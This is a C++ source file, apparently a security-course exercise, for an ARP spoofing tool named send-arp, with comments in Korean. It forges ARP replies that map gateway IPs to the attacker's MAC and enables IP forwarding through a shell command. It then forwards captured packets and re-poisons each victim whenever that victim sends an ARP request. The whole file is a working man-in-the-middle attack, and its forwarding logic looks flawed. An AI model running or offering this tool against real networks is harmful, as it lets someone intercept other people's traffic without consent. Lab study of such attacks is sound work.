#include <cstdio>
#include <pcap.h>
#include <string>
#include <vector>
#include <cstring>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <thread>
#include <atomic>
#include <chrono>
#include <map>
#include <mutex>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

std::atomic<bool> stop_flag(false);
std::map<Ip, Ip> target_map; // 송신자 IP를 게이트웨이 IP에 매핑
std::mutex target_map_mutex;

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac getAttackerMac(const char* dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        exit(1);
    }
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    Mac attackerMac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
    printf("Attacker MAC: %s\n", std::string(attackerMac).c_str());
    return attackerMac;
}

void sendArpSpoof(pcap_t* handle, Mac attackerMac, Ip senderIp, Ip targetIp) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = attackerMac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attackerMac;
    packet.arp_.sip_ = htonl(targetIp);
    packet.arp_.tmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.arp_.tip_ = htonl(senderIp);
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    } else {
        printf("ARP spoofing packet sent successfully to %s\n", std::string(senderIp).c_str());
    }
}

void enableIpForwarding() {
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    printf("IP forwarding enabled\n");
}

void packetHandler(u_char *userData, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    // 패킷 포워딩
    pcap_t* handle = *((pcap_t**)userData);
    if (pcap_sendpacket(handle, packet, pkthdr->len) != 0) {
        fprintf(stderr, "Error forwarding packet: %s\n", pcap_geterr(handle));
    }
}

void broadcastDetectionThread(pcap_t* handle, Mac attackerMac) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    
    while (!stop_flag) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthHdr* ethHdr = (EthHdr*)packet;
        if (ntohs(ethHdr->type_) == EthHdr::Arp) {
            ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
            if (ntohs(arpHdr->op_) == ArpHdr::Request) {
                Ip senderIp = ntohl(arpHdr->sip_);
                
                std::lock_guard<std::mutex> lock(target_map_mutex);
                auto it = target_map.find(senderIp);
                if (it != target_map.end()) {
                    printf("Broadcast ARP request detected from %s. Re-infecting...\n", std::string(senderIp).c_str());
                    sendArpSpoof(handle, attackerMac, senderIp, it->second);
                }
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }
    
    char* dev = argv[1];
    printf("Interface: %s\n", dev);
    
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    Mac attackerMac = getAttackerMac(dev);
    
    for (int i = 2; i < argc; i += 2) {
        Ip senderIp = Ip(argv[i]);
        Ip gatewayIp = Ip(argv[i+1]);
        {
            std::lock_guard<std::mutex> lock(target_map_mutex);
            target_map[senderIp] = gatewayIp;
        }
        printf("\nSending initial ARP spoof packet: Sender IP %s, Gateway IP %s\n", 
               std::string(senderIp).c_str(), std::string(gatewayIp).c_str());
        sendArpSpoof(handle, attackerMac, senderIp, gatewayIp);
    }
    
    enableIpForwarding();
    
    printf("Starting broadcast detection thread and packet forwarding...\n");
    
    // 브로드캐스트 감지 스레드 시작
    std::thread detection(broadcastDetectionThread, handle, attackerMac);
    
    // 메인 스레드에서 패킷 포워딩 수행
    pcap_loop(handle, 0, packetHandler, (u_char*)&handle);
    
    // 정리
    stop_flag = true;
    detection.join();
    pcap_close(handle);
    return 0;
}
